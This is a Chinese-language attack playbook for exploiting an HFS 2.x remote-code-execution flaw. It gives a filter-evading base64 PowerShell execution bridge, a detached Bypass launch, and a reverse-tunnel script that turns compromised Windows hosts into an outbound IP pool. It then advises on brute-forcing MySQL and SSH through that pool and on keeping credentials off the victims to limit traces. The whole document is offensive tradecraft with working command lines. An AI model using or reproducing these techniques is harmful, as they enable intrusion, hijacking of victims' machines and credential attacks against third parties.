# HFS 靶机上的任意 PowerShell 执行 + 反向隧道（把 RCE 变成出口 IP 池）

适用：HFS 2.x RCE（CVE-2026-97359）拿到 `.save` 可写靶机后，想在 Windows 上跑
复杂逻辑（HTTP 请求、socket、长驻隧道），但 `.save` 的毒点字符和 URL 长度处处卡人。

## 1. `.save` 的真实约束（实测）

| 事实 | 说明 |
|------|------|
| 毒点 `\|` `"` `/` `%` `'` `&` | 出现在正文 → 参数被截断或整写静默变空 |
| `>` `<` | 被 HTML 转义成 `&gt;`，重定向废掉 |
| URL 长度 | 单次 `.save` 正文上限约 1-2KB；4KB 直接被截，**不报错** |
| `.read` 宏 | 部分版本 `macro error: read not supported` → 改用 `type x.txt` 读回 bat |
| 频率限制 | 连续快速 knock 会回 `Not allowed.` → 必须 2-3s 间隔 + 冷却重试 |
| 执行回显 | `.exec` 回显会截断；长输出写文件再读 |
| 二进制输出 | `Set-Content -Encoding UTF8` 会被二进制字节写坏 → 用 `[BitConverter]::ToString($b,0,$n)` 输出十六进制 |

## 2. base64 + `#` 代 `/` 的执行桥

核心：PowerShell 脚本 → UTF-16LE base64 → **把 base64 里的 `/` 换成 `#`**（base64 字母表
只有 `A-Za-z0-9+/=`，换掉 `/` 后零毒点）→ 分块 `.save` → 在靶机上还原执行。

**转换+执行 bat（正文零毒点，可安全 `.save`）**：

```
powershell -Command $c=([string]::Concat((Get-Content t1a.tpl,t1b.tpl -Raw))).Replace([char]35,[char]47); Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($c)))
```

要点：
- **块名必须显式列出**：`Get-Content t1a.tpl,t1b.tpl -Raw`。**通配 `t1*.tpl` 在 PS 5.1 下静默失败**（脚本不执行、不报错，最难查的坑）。
- `[string]::Concat(array)` 拼块；`-join` 需要 `'` 引号，是毒点，别用。
- `[char]35`=`#`，`[char]47`=`/`。

## 3. 长驻脚本必须脱离

`.exec` 会阻塞等进程结束，长驻隧道会被 HFS 超时掐掉。用 `start` 脱离，
且**不要引号、不要斜杠**（都是毒点）：

```
start powershell -ExecutionPolicy Bypass -File tun.ps1
```

（`start` 后第一个 token 当命令名即可，无需 `""` 标题、无需 `/min`。）

## 4. 反向隧道（免提权把靶机变成出口 IP）

goal：让靶机的**出站**连接穿透成我们的入口，不需要 netsh/portproxy（那要提权，UAC 会过滤掉）。

协议（v3，实测可用）：
1. 靶机连控制端 `443 / 8443 / 44433 / 9443`（多端口兜底，中国云常拦非标出站）
2. 控制端发 **1 字节目标索引**
3. 靶机回连目标，**成功后回 1 字节 `R`**（就绪信号——没有它会在队列里塞满已死会话，
   NET 噪声高达 60%+）
4. 控制端把靶机 IP 用 16 字节头 `[ip(15) + \n]` 交给本机客户端，之后裸透传

靶机侧一个 PS 脚本搞定（`CopyToAsync` 双向转发）：

```powershell
$a.WriteByte(82); $a.Flush()          # 'R' 就绪
$t1=$a.CopyToAsync($b); $t2=$b.CopyToAsync($a)
[Threading.Tasks.Task]::WaitAny(@($t1,$t2))
```

控制端：每个目标开 **多条本地通道**（如 20 条）→ 通道数 = 并发上限。
实测 24 台靶机 / 60 通道 ≈ **4.5-8 发/秒**，全部以靶机 IP 为源。

## 5. 用它打 MySQL 的坑

把隧道当出口打 MySQL：**每台靶机 IP 有自己的 host_cache 预算（约 100 错连接）**，
烧完就全变 `Host 'x' is blocked`。60 通道一冲，同一台机器并发几十条，很快烧穿。
→ **MySQL 用多 IP 轮换（代理池）更合适；隧道更适合打 SSH（无 host_cache 机制）。**

## 6. 隐私纪律

靶机上只落 **控制端 IP + 目标 IP**；密码字典/凭据**绝不落盘**（逻辑放在控制端，
靶机只做 socket 透传）。这条是硬要求。
